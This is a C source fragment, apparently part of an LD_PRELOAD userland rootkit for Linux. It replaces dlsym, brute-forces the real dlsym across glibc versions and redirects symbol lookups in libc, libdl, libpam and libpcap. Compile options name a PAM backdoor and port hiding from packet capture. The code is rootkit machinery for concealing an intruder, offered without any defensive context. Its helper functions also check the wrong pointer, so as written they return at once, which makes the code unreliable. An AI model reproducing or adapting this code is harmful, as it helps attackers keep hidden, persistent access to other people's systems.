void get_libc_symbol(const char *symbol, void **funcptr){
    if(funcptr != NULL) return;

    libc_handle = dlopen(LIBC_PATH, RTLD_LAZY);
    for(int i = 0; i < LIBC_CALLS_SIZE; i++){
        char *curcall = libc_calls[i];

        if(!strncmp(symbol, curcall, strlen(curcall))){
            *funcptr = o_dlsym(libc_handle, symbol);
            break;
        }
    }
}

void get_libdl_symbol(const char *symbol, void **funcptr){
    if(funcptr != NULL) return;

    libdl_handle = dlopen(LIBDL_PATH, RTLD_LAZY);
    for(int i = 0; i < LIBDL_CALLS_SIZE; i++){
        char *curcall = libdl_calls[i];

        if(!strncmp(symbol, curcall, strlen(curcall))){
            *funcptr = o_dlsym(libdl_handle, symbol);
            break;
        }
    }
}

#if defined(HIDE_HOOKS) && \
    defined(USE_PAM_BD)
void get_libpam_symbol(const char *symbol, void **funcptr){
    if(funcptr != NULL) return;

    libpam_handle = dlopen(LIBPAM_PATH, RTLD_LAZY);
    for(int i = 0; i < LIBPAM_CALLS_SIZE; i++){
        char *curcall = libpam_calls[i];

        if(!strncmp(symbol, curcall, strlen(curcall))){
            *funcptr = o_dlsym(libpam_handle, symbol);
            break;
        }
    }
}
#endif

#ifdef HIDE_PORTS
void get_libpcap_symbol(const char *symbol, void **funcptr){
    if(funcptr != NULL) return;

    libpcap_handle = dlopen(LIBPCAP_PATH, RTLD_LAZY);
    for(int i = 0; i < LIBPCAP_CALLS_SIZE; i++){
        char *curcall = libpcap_calls[i];

        if(!strncmp(symbol, curcall, strlen(curcall))){
            *funcptr = o_dlsym(libpcap_handle, symbol);
            break;
        }
    }
}
#endif

void locate_dlsym(void){
    if(o_dlsym != NULL) return;

    char buf[32];
    char *dlsym_str = strdup(DLSYM_STR);
    char *gvstr = strdup(GLIBC_VER_STR);
    char *gvvstr = strdup(GLIBC_VERVER_STR);

    /* here we essentially are bruteforcing the location of dlsym
     * by iterating through every hypothetically possible version of libc. */
    for(int a = 0; a < GLIBC_MAX_VER; a++){
        snprintf(buf, sizeof(buf), gvstr, a);

        if((o_dlsym = (void*(*)(void *handle, const char *name))dlvsym(RTLD_NEXT, dlsym_str, buf)))
            goto end_locate_dlsym;
    }

    for(int a = 0; a < GLIBC_MAX_VER; a++){
        for(int b = 0; b < GLIBC_MAX_VER; b++){
            snprintf(buf, sizeof(buf), gvvstr, a, b);

            if((o_dlsym = (void*(*)(void *handle, const char *name))dlvsym(RTLD_NEXT, dlsym_str, buf)))
                goto end_locate_dlsym;
        }
    }
end_locate_dlsym:
    //free(dlsym_str); free(gvstr); free(gvvstr);
    if(o_dlsym == NULL)
        exit(0);
}

void *dlsym(void *handle, const char *symbol){
    void *ptr = NULL;

    /* begin resolving our specified symbol from whichever lib's functions we've hooked. */
    locate_dlsym();

#ifdef HIDE_HOOKS
    get_libc_symbol(symbol, &ptr);
    get_libdl_symbol(symbol, &ptr);
#endif

#if defined(HIDE_HOOKS) && \
    defined(USE_PAM_BD)
    get_libpam_symbol(symbol, &ptr);
#endif

#if defined(HIDE_HOOKS) && \
    defined(HIDE_PORTS)
    get_libpcap_symbol(symbol, &ptr);
#endif

    if(ptr == NULL)
        ptr = o_dlsym(handle, symbol);
    return ptr;
}
